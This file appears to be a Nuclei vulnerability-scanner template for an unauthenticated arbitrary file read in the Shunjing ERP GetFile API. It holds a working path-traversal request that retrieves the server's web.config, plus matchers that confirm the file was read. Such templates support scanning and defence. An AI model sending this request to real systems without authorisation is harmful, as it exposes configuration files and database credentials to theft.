id: shunjing-erp-getfile-fileread

info:
  name: 顺景ERP系统GetFile任意文件读取漏洞
  author: qwtd
  severity: high
  description: |
    顺景ERP Download/GetFile 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
  tags: 顺景ERP

http:
  - raw:
      - |
        GET /api/Download/GetFile?FileName=/../web.config&Title= HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - 'configuration'
          - 'configSections'
        condition: and
